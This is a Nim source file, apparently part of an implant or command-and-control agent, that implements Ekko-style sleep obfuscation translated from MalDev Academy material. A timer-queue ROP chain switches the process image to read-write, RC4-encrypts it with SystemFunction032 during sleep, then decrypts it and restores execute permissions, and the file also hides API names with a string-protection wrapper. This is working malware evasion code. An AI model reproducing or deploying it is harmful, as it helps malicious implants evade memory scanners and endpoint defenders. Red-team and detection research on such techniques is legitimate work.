import winim/lean
import strformat
import ../../common/[types, utils, crypto] 

import sugar

# Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
# The code in this file was taken from the MalDev Academy modules 54,56 & 59 and translated from C to Nim
# https://maldevacademy.com/new/modules/54?view=blocks

type 
    USTRING* {.bycopy.} = object 
        Length*: DWORD 
        MaximumLength*: DWORD 
        Buffer*: PVOID

    EVENT_TYPE = enum 
        NotificationEvent, 
        SynchronizationEvent

# Required APIs (definitions taken from NtDoc)
proc RtlCreateTimerQueue*(phTimerQueueHandle: PHANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimerQueue"), dynlib: protect("ntdll.dll").}
proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateEvent"), dynlib: protect("ntdll.dll").}
proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
proc RtlDeleteTimerQueue(hQueue: HANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlDeleteTimerQueue"), dynlib: protect("ntdll.dll").}

proc sleepEkko*(sleepDelay: int) = 
    
    var 
        status: NTSTATUS = 0
        key: USTRING = USTRING(Length: 0)
        img: USTRING = USTRING(Length: 0)
        ctx: array[7, CONTEXT]
        ctxInit: CONTEXT
        hEvent: HANDLE
        hEventStart: HANDLE
        hEventEnd: HANDLE
        queue: HANDLE
        timer: HANDLE 
        value: DWORD = 0
        delay: DWORD = 0
    
    try: 
        var 
            NtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue")
            SystemFunction032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032")

        # Locate image base and size
        var imageBase = GetModuleHandleA(NULL)
        var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
        # echo fmt"[+] Image base at: 0x{cast[uint64](imageBase).toHex()} ({imageSize} bytes)"
        
        img.Buffer = cast[PVOID](imageBase)
        img.Length = imageSize

        # Generate random encryption key
        var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
        key.Buffer = keyBuffer.addr
        key.Length = cast[DWORD](keyBuffer.len())

        # Sleep obfuscation implementation using NTAPI
        # Create timer queue
        status = RtlCreateTimerQueue(addr queue) 
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        # Create events
        status = NtCreateEvent(addr hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        status = NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        status = NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        # Retrieve the initial thread context
        status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, 0, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, $status.toHex())

        # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
        status = RtlCreateTimer(queue, addr timer, SetEvent, addr hEvent, 0, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, $status.toHex())

        WaitForSingleObject(hEvent, 1000)

        # Preparing the ROP chain 
        # Initially, each element in this array will have the same context as the timer's thread context
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
            dec(ctx[i].Rsp, 8) # Stack alignment, due to the RSP register being incremented by the size of a pointer
        
        # ROP Chain
        # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
        ctx[0].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[0].Rcx = cast[DWORD64](hEventStart)
        ctx[0].Rdx = cast[DWORD64](INFINITE)
        ctx[0].R8  = cast[DWORD64](NULL)

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[1].Rip = cast[DWORD64](VirtualProtect)
        ctx[1].Rcx = cast[DWORD64](imageBase)
        ctx[1].Rdx = cast[DWORD64](imageSize)
        ctx[1].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[1].R9  = cast[DWORD64](addr value)

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[2].Rip = cast[DWORD64](SystemFunction032)
        ctx[2].Rcx = cast[DWORD64](addr img)
        ctx[2].Rdx = cast[DWORD64](addr key)

        # ctx[3] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[3].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[3].Rcx = cast[DWORD64](GetCurrentProcess())
        ctx[3].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[3].R8  = cast[DWORD64](FALSE)

        # ctx[4] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[4].Rip = cast[DWORD64](SystemFunction032)
        ctx[4].Rcx = cast[DWORD64](addr img)
        ctx[4].Rdx = cast[DWORD64](addr key)

        # ctx[5] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[5].Rip = cast[DWORD64](VirtualProtect)
        ctx[5].Rcx = cast[DWORD64](imageBase)
        ctx[5].Rdx = cast[DWORD64](imageSize)
        ctx[5].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[5].R9  = cast[DWORD64](addr value)
        
        # ctx[6] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
        ctx[6].Rip = cast[DWORD64](SetEvent)
        ctx[6].Rcx = cast[DWORD64](hEventEnd)

        # Executing timers
        for i in 0 ..< ctx.len(): 
            delay += 100
            status = RtlCreateTimer(queue, addr timer, NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, $status.toHex())
            
        echo "[*] Triggering sleep obfuscation"

        status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, $status.toHex())

    except CatchableError as err: 
        echo "[-] ", err.msg

    finally: 
        # Cleanup 
        if queue != 0: discard RtlDeleteTimerQueue(queue)
        if hEvent != 0: CloseHandle(hEvent)
        if hEventStart != 0: CloseHandle(hEventStart)
        if hEventEnd != 0: CloseHandle(hEventEnd)